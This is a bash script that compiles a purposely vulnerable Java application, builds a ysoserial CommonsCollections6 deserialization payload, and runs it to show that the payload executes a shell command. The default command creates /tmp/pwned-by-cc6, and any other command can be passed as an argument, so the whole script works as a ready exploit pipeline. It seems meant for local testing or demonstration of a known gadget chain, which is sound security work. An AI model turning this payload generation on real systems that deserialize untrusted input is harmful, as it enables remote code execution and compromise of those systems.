#!/bin/bash
# Test script for CommonsCollections6 payload
# Works on Java 8+ including modern versions!

set -e

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
PROJECT_DIR="$(dirname "$SCRIPT_DIR")"
JAVA_HOME="/usr/lib/jvm/java-8-openjdk"

echo "========================================="
echo "CommonsCollections6 Payload Test"
echo "========================================="
echo "Using Java from: $JAVA_HOME"
$JAVA_HOME/bin/java -version 2>&1 | head -1
echo ""
echo "NOTE: CC6 works on modern Java versions!"
echo "      (Unlike CC1 which requires Java 8u71 or earlier)"
echo ""

# Step 1: Compile the vulnerable test application
echo "[1] Compiling VulnerableApp.java..."
$JAVA_HOME/bin/javac \
    -cp "$PROJECT_DIR/target/ysoserial-0.0.6-SNAPSHOT-all.jar" \
    "$SCRIPT_DIR/VulnerableApp.java"

if [ $? -eq 0 ]; then
    echo "    ✓ Compilation successful"
else
    echo "    ✗ Compilation failed"
    exit 1
fi
echo ""

# Step 2: Generate payload
COMMAND="${1:-touch /tmp/pwned-by-cc6}"
echo "[2] Generating CommonsCollections6 payload..."
echo "    Command: $COMMAND"

"$PROJECT_DIR/ysoserial-java8.sh" CommonsCollections6 "$COMMAND" > "$SCRIPT_DIR/payload-cc6.ser"

if [ $? -eq 0 ]; then
    PAYLOAD_SIZE=$(stat -c%s "$SCRIPT_DIR/payload-cc6.ser" 2>/dev/null || stat -f%z "$SCRIPT_DIR/payload-cc6.ser" 2>/dev/null)
    echo "    ✓ Payload generated: $PAYLOAD_SIZE bytes"
else
    echo "    ✗ Payload generation failed"
    exit 1
fi
echo ""

# Step 3: Run the vulnerable application
echo "[3] Running vulnerable application to deserialize payload..."
echo "    (This will execute the command if successful)"
echo ""
echo "----------------------------------------"

$JAVA_HOME/bin/java \
    -cp "$SCRIPT_DIR:$PROJECT_DIR/target/ysoserial-0.0.6-SNAPSHOT-all.jar" \
    VulnerableApp "$SCRIPT_DIR/payload-cc6.ser"

EXIT_CODE=$?

echo "----------------------------------------"
echo ""

# Step 4: Verify results
echo "[4] Verification..."

if [ "$COMMAND" == "touch /tmp/pwned-by-cc6" ]; then
    if [ -f "/tmp/pwned-by-cc6" ]; then
        echo "    ✓ SUCCESS! File /tmp/pwned-by-cc6 was created"
        echo "    ✓ The payload executed successfully!"
        rm /tmp/pwned-by-cc6
    else
        echo "    ✗ File /tmp/pwned-by-cc6 was NOT created"
        echo "    ✗ Payload may have failed to execute"
    fi
else
    echo "    Custom command used: $COMMAND"
    echo "    Please verify manually if the command executed"
fi

echo ""
echo "========================================="
echo "Test completed (exit code: $EXIT_CODE)"
echo "========================================="

exit $EXIT_CODE
